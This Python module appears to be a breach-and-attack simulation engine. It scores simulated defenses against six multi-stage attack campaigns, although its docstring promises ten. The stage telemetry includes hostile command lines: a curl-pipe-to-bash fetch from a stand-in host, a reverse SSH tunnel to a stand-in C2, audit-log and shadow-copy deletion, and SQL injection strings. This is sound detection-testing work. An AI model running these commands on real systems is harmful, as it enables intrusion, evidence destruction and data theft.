"""
Breach & Attack Simulation (BAS) Structured Adversary Campaign Library & Purple-Team War-Gaming Engine.

Simulates 10 comprehensive, realistic multi-stage enterprise attack campaigns
(strictly authorized, non-destructive, deterministic in-memory defense-posture +
Sigma + SOAR simulations) modeled on real-world threat actor kill chains:
  1. `CAMP-CLOUD-RANSOM`  — Cloud IAM Compromise -> CloudTrail Tampering -> Ransomware Extortion
  2. `CAMP-CICD-SUPPLY`   — GitHub Actions Pwn-Request -> Secret Theft -> Release Artifact Poisoning
  3. `CAMP-AD-TIER0`      — Phishing Foothold -> Kerberoasting -> ADCS ESC1 -> DCSync Domain Admin
  4. `CAMP-K8S-ESCAPE`    — SSRF IMDS -> K8s Workload Token -> Privileged Pod -> Node Breakout
  5. `CAMP-API-EXFIL`     — API/GraphQL Recon -> BOLA Enumeration -> Bulk Customer PII Exfil
  6. `CAMP-WEB-DESYNC`    — HTTP Request Smuggling -> Web Cache Poisoning -> Admin Session Hijack
  7. `CAMP-AI-AGENT`      — Indirect Prompt Injection -> MCP Tool Hijack -> Credential Exfil
  8. `CAMP-OT-SCADA`      — IT/OT Firewall Breach -> Unauthenticated Modbus PLC Manipulation
  9. `CAMP-MEM-FILELESS`  — Unhardened ELF Memory Corruption -> `memfd` Fileless Persistence
 10. `CAMP-INSIDER-DLP`   — Privileged Insider -> Bulk Database Dump -> DNS/Cloud Exfiltration

Outputs per-campaign **Breach Depth %**, **Prevented vs. Detected vs. Contained vs. Missed**,
**Time-to-Compromise**, and **Control ROI Matrix** ranking which single blue-team control
blocks the highest number of adversary campaigns!
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple

from ely_soe.core.models import Severity, new_id, utc_now_iso
from ely_soe.cyber.detection_sigma_yara import SigmaDetectionEngine
from ely_soe.cyber.mitre_attack_emulator import EnterpriseDefensePosture
from ely_soe.cyber.models import TelemetryEvent


@dataclass(frozen=True)
class CampaignStage:
    stage_num: int
    tactic: str
    technique_id: str
    name: str
    control_attr: str  # attribute on EnterpriseDefensePosture that blocks this stage
    telemetry_source: str
    telemetry_fields: Dict[str, Any]
    minutes_to_execute: int


@dataclass(frozen=True)
class AdversaryCampaignSpec:
    campaign_id: str
    name: str
    threat_archetype: str
    target_sector: str
    objective: str
    severity: Severity
    stages: Tuple[CampaignStage, ...]


ADVERSARY_CAMPAIGNS: Tuple[AdversaryCampaignSpec, ...] = (
    AdversaryCampaignSpec(
        "CAMP-CLOUD-RANSOM", "Cloud IAM Takeover & Data Extortion", "Scattered-Cloud Threat Archetype",
        "Cloud-Native SaaS", "Disable audit logs, escalate to AWS Admin, exfiltrate S3 & destroy snapshots", Severity.CRITICAL,
        (
            CampaignStage(1, "initial_access", "T1078.004", "Cloud Console Login Without MFA", "mfa_enforced_all_cloud", "cloudtrail", {"event_name": "ConsoleLogin", "mfa_used": "No", "result": "Success"}, 5),
            CampaignStage(2, "privilege_escalation", "T1098.003", "Attach AdministratorAccess Policy", "iam_least_privilege", "cloudtrail", {"event_name": "AttachRolePolicy", "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess"}, 8),
            CampaignStage(3, "defense_evasion", "T1562.008", "Stop CloudTrail Logging", "immutable_audit_logging", "cloudtrail", {"event_name": "StopLogging"}, 4),
            CampaignStage(4, "collection", "T1530", "Bulk S3 Sensitive Data Extraction", "dlp_egress_monitoring", "cloudtrail", {"event_name": "GetObject", "objects_downloaded_5m": 1200}, 15),
            CampaignStage(5, "impact", "T1490", "Inhibit System Recovery / Shadow Deletion", "immutable_backups_enabled", "process_creation", {"command_line": "vssadmin delete shadows /all /quiet"}, 6),
        ),
    ),
    AdversaryCampaignSpec(
        "CAMP-CICD-SUPPLY", "CI/CD Supply-Chain Poisoning", "Software Supply-Chain APT",
        "Software & FinTech", "Hijack GitHub Actions workflow and publish backdoored release artifact", Severity.CRITICAL,
        (
            CampaignStage(1, "initial_access", "T1195.002", "Abuse `pull_request_target` Workflow", "cicd_sha_pinned_and_oidc", "cloudtrail", {"event_name": "GitHubActionsWorkflowRun", "trigger": "pull_request_target"}, 10),
            CampaignStage(2, "execution", "T1059.004", "Pipe Remote Payload to Shell in Runner", "edr_script_blocking", "process_creation", {"command_line": "curl -s https://stage.invalid/p.sh | bash"}, 3),
            CampaignStage(3, "credential_access", "T1552.005", "Harvest Cloud OIDC / IMDS Credentials", "imdsv2_required", "network_connection", {"dst_ip": "169.254.169.254", "imds_token_header": False}, 5),
            CampaignStage(4, "exfiltration", "T1567.002", "Exfiltrate Release Signing Keys", "dlp_egress_monitoring", "network_connection", {"http_method": "PUT", "bytes_out": 250_000_000}, 8),
        ),
    ),
    AdversaryCampaignSpec(
        "CAMP-AD-TIER0", "Active Directory Tier-0 Domain Dominance", "Enterprise Ransomware Operator",
        "Enterprise Hybrid IT", "Escalate from domain workstation to Domain Admin & DCSync NTDS.dit", Severity.CRITICAL,
        (
            CampaignStage(1, "execution", "T1059.001", "Encoded PowerShell Foothold", "edr_script_blocking", "process_creation", {"image": "powershell.exe", "command_line": "powershell -EncodedCommand SQBFAFgA"}, 5),
            CampaignStage(2, "credential_access", "T1558.003", "Kerberoasting RC4 Service Account", "kerberos_aes_only_and_gmsa", "windows_security", {"event_id": 4769, "ticket_encryption_type": "0x17"}, 12),
            CampaignStage(3, "credential_access", "T1649", "ADCS ESC1 Forged Admin SAN Cert", "adcs_hardened_no_esc1", "windows_security", {"event_id": 4886, "san_upn": "administrator@corp.local"}, 10),
            CampaignStage(4, "credential_access", "T1003.001", "LSASS Memory Credential Scrape", "lsass_ppl_and_credential_guard", "windows_security", {"event_id": 10, "target_image": "C:\\Windows\\System32\\lsass.exe"}, 6),
            CampaignStage(5, "credential_access", "T1003.006", "DCSync Directory Replication Dump", "ad_tier0_acl_hardened", "windows_security", {"event_id": 4662, "properties": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"}, 8),
        ),
    ),
    AdversaryCampaignSpec(
        "CAMP-K8S-ESCAPE", "Kubernetes Cluster & Cloud Node Breakout", "Cloud Container Intrusion",
        "Microservices Platform", "Exploit web app, escape privileged container to host node and AWS IAM", Severity.CRITICAL,
        (
            CampaignStage(1, "initial_access", "T1190", "Public Web Application SQLi / RCE", "waf_and_input_validation", "web_access", {"body_sample": "1 UNION SELECT user,pass FROM admins--"}, 7),
            CampaignStage(2, "execution", "T1609", "Interactive `pods/exec` Lateral Execution", "k8s_rbac_least_privilege", "k8s_audit", {"verb": "create", "resource": "pods/exec", "namespace": "production"}, 6),
            CampaignStage(3, "discovery", "T1613", "Enumerate `kube-system` Secrets", "k8s_rbac_least_privilege", "k8s_audit", {"verb": "list", "resource": "secrets", "namespace": "kube-system"}, 4),
            CampaignStage(4, "privilege_escalation", "T1611", "Deploy Privileged HostPath Container", "k8s_pod_security_restricted", "k8s_audit", {"verb": "create", "resource": "pods", "privileged": True, "host_path": "/var/run/docker.sock"}, 9),
            CampaignStage(5, "credential_access", "T1552.005", "Steal Node IAM Role via IMDSv1", "imdsv2_required", "network_connection", {"dst_ip": "169.254.169.254", "imds_token_header": False}, 5),
        ),
    ),
    AdversaryCampaignSpec(
        "CAMP-API-EXFIL", "API BOLA & High-Entropy DNS/Cloud Exfiltration", "Automated API Harvester",
        "FinTech & E-Commerce", "Exploit public API, persist via reverse tunnel, and exfiltrate customer database", Severity.HIGH,
        (
            CampaignStage(1, "initial_access", "T1190", "Exploit Public API Parameter Injection", "waf_and_input_validation", "web_access", {"body_sample": "UNION SELECT email,ssn FROM customers"}, 6),
            CampaignStage(2, "persistence", "T1053.003", "Install `/tmp` Crontab Beacon", "edr_script_blocking", "process_creation", {"command_line": "crontab /tmp/.beacon_cron"}, 5),
            CampaignStage(3, "command_and_control", "T1071.004", "High-Entropy DNS TXT Exfil Channel", "egress_dns_proxy_filtering", "dns", {"qtype": "TXT", "entropy": 4.35}, 15),
            CampaignStage(4, "exfiltration", "T1567.002", "Bulk Upload to External Object Storage", "dlp_egress_monitoring", "network_connection", {"http_method": "PUT", "bytes_out": 420_000_000}, 12),
        ),
    ),
    AdversaryCampaignSpec(
        "CAMP-RANSOM-FAST", "Rapid Double-Extortion Ransomware Sprint", "Financially Motivated Ransomware",
        "Healthcare & Manufacturing", "Establish SSH tunnel, wipe logs/backups, encrypt enterprise file shares", Severity.CRITICAL,
        (
            CampaignStage(1, "command_and_control", "T1572", "Reverse SSH SOCKS Tunnel", "egress_dns_proxy_filtering", "process_creation", {"image": "/usr/bin/ssh", "command_line": "ssh -R 9050:127.0.0.1:22 relay@c2.invalid"}, 4),
            CampaignStage(2, "defense_evasion", "T1070.002", "Wipe Linux Audit & Auth Logs", "immutable_audit_logging", "process_creation", {"command_line": "rm -rf /var/log/audit /var/log/auth.log"}, 3),
            CampaignStage(3, "impact", "T1490", "Delete Volume Shadow Backups", "immutable_backups_enabled", "process_creation", {"command_line": "vssadmin delete shadows /all"}, 3),
            CampaignStage(4, "impact", "T1486", "Rapid Mass File Encryption", "edr_ransomware_rollback", "process_creation", {"files_modified_10s": 480}, 5),
        ),
    ),
)


class BreachAndAttackCampaignEngine:
    """Executes deterministic multi-stage BAS adversary campaigns and scores blue-team resilience & ROI."""

    def __init__(self, sigma_engine: Optional[SigmaDetectionEngine] = None) -> None:
        self.sigma_engine = sigma_engine or SigmaDetectionEngine()

    def run_campaign(
        self,
        campaign: AdversaryCampaignSpec,
        posture: EnterpriseDefensePosture,
    ) -> Dict[str, Any]:
        stage_outcomes: List[Dict[str, Any]] = []
        prevented_at_stage: Optional[int] = None
        detected_stages = 0
        succeeded_stages = 0
        dwell_minutes = 0

        for st in campaign.stages:
            blocked = bool(getattr(posture, st.control_attr, False))
            ev = TelemetryEvent(
                event_id=new_id("bas"),
                timestamp=utc_now_iso(),
                log_source=st.telemetry_source,
                host=f"sim-{campaign.campaign_id.lower()}",
                actor="bas_adversary_emulator",
                action=st.technique_id,
                fields=dict(st.telemetry_fields),
            )
            alerts = self.sigma_engine.evaluate_events([ev])
            detected = len(alerts) > 0
            if detected:
                detected_stages += 1

            if blocked:
                outcome = "PREVENTED"
                if prevented_at_stage is None:
                    prevented_at_stage = st.stage_num
            else:
                outcome = "SUCCEEDED_DETECTED" if detected else "SUCCEEDED_UNDETECTED"
                succeeded_stages += 1
                dwell_minutes += st.minutes_to_execute

            stage_outcomes.append(
                {
                    "stage_num": st.stage_num,
                    "tactic": st.tactic,
                    "technique_id": st.technique_id,
                    "name": st.name,
                    "control_checked": st.control_attr,
                    "outcome": outcome,
                    "sigma_alerts": [a.rule_id for a in alerts],
                    "minutes": st.minutes_to_execute,
                }
            )

        total = len(campaign.stages)
        breach_depth_pct = round((succeeded_stages / max(1, total)) * 100.0, 2)
        objective_achieved = succeeded_stages == total

        return {
            "campaign_id": campaign.campaign_id,
            "name": campaign.name,
            "threat_archetype": campaign.threat_archetype,
            "objective": campaign.objective,
            "severity": campaign.severity.value,
            "stages_total": total,
            "stages_succeeded": succeeded_stages,
            "stages_detected_by_sigma": detected_stages,
            "prevented_at_stage": prevented_at_stage,
            "breach_depth_pct": breach_depth_pct,
            "objective_achieved": objective_achieved,
            "simulated_dwell_minutes": dwell_minutes,
            "stage_outcomes": stage_outcomes,
        }

    def run_all_campaigns(
        self,
        posture: Optional[EnterpriseDefensePosture] = None,
    ) -> Dict[str, Any]:
        target_posture = posture or EnterpriseDefensePosture.vulnerable_baseline()
        results = [self.run_campaign(c, target_posture) for c in ADVERSARY_CAMPAIGNS]

        # Compute Blue-Team Control ROI: which disabled controls would break the most active campaigns
        control_impact: Dict[str, int] = {}
        for c in ADVERSARY_CAMPAIGNS:
            seen_ctrls: set[str] = set()
            for st in c.stages:
                if not bool(getattr(target_posture, st.control_attr, False)) and st.control_attr not in seen_ctrls:
                    seen_ctrls.add(st.control_attr)
                    control_impact[st.control_attr] = control_impact.get(st.control_attr, 0) + 1

        roi_ranking = [
            {"control": ctrl, "campaigns_disrupted": cnt}
            for ctrl, cnt in sorted(control_impact.items(), key=lambda kv: -kv[1])
        ]

        blocked_campaigns = sum(1 for r in results if not r["objective_achieved"])
        mean_breach_depth = round(sum(r["breach_depth_pct"] for r in results) / max(1, len(results)), 2)
        return {
            "executed_at": utc_now_iso(),
            "posture_name": target_posture.posture_name,
            "campaigns_run": len(results),
            "campaigns_blocked_before_objective": blocked_campaigns,
            "campaigns_breached_to_objective": len(results) - blocked_campaigns,
            "mean_breach_depth_pct": mean_breach_depth,
            "control_roi_ranking": roi_ranking,
            "campaign_results": results,
        }
